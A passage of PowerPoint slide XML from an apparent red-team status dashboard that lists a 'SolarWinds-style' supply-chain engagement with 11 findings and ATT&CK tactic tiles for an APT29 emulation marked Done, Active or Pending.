      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="3840480"/>
            <a:ext cx="7498079"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298448" y="3840480"/>
            <a:ext cx="7498079" cy="91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15400" y="3767328"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>100%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Rectangle 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4059936"/>
            <a:ext cx="11731752" cy="521207"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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7472" y="4151376"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RT-2026-01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="4151376"/>
            <a:ext cx="4114800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Supply Chain Attack — SolarWinds-style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532120" y="4151376"/>
            <a:ext cx="2011680" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat actor: Custom</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="4151376"/>
            <a:ext cx="1097280" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>COMPLETED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8869680" y="4151376"/>
            <a:ext cx="3017520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>11 findings  |  3 critical</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Rectangle 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="4407408"/>
            <a:ext cx="7498079"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98448" y="4407408"/>
            <a:ext cx="7498079" cy="91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5400" y="4334256"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>100%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Rectangle 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="468172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8600" y="4718304"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Kill Chain Phases — APT29 Emulation (Currently: Lateral Movement Phase)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Rectangle 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4956048"/>
            <a:ext cx="1316736" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="071E15"/>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2608" y="4992624"/>
            <a:ext cx="1188720" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reconn.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608" y="5212080"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TA0043</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608" y="5394960"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Done</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Rectangle 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1572768" y="4956048"/>
            <a:ext cx="1316736" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="071E15"/>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636776" y="4992624"/>
            <a:ext cx="1188720" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Initial Acc.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1636776" y="5212080"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TA0001</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1636776" y="5394960"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Done</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Rectangle 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2916936" y="4956048"/>
            <a:ext cx="1316736" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="071E15"/>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980944" y="4992624"/>
            <a:ext cx="1188720" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Execution</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2980944" y="5212080"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TA0002</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="TextBox 59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2980944" y="5394960"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Done</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Rectangle 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4261104" y="4956048"/>
            <a:ext cx="1316736" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="071E15"/>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25112" y="4992624"/>
            <a:ext cx="1188720" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Persistence</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4325112" y="5212080"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TA0003</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4325112" y="5394960"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Done</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Rectangle 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5605272" y="4956048"/>
            <a:ext cx="1316736" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="071E15"/>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669280" y="4992624"/>
            <a:ext cx="1188720" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Priv. Esc.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5669280" y="5212080"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TA0004</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="TextBox 67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5669280" y="5394960"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Done</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Rectangle 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6949440" y="4956048"/>
            <a:ext cx="1316736" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="231010"/>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13448" y="4992624"/>
            <a:ext cx="1188720" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Def. Evasion</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7013448" y="5212080"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TA0005</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="TextBox 71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7013448" y="5394960"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Done</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Rectangle 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8293608" y="4956048"/>
            <a:ext cx="1316736" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="231B05"/>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57616" y="4992624"/>
            <a:ext cx="1188720" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lat. Move</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="5212080"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TA0008</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="TextBox 75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="5394960"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Active</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Rectangle 76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9637776" y="4956048"/>
            <a:ext cx="1316736" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="040508"/>
          </a:solidFill>
          <a:ln w="762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701784" y="4992624"/>
            <a:ext cx="1188720" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Collection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9701784" y="5212080"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TA0009</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9701784" y="5394960"/>
            <a:ext cx="1188720" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1E283C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pending</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Rectangle 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10981944" y="4956048"/>
            <a:ext cx="1316736" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="040508"/>
          </a:solidFill>
          <a:ln w="762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1045952" y="4992624"/>
            <a:ext cx="1188720" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
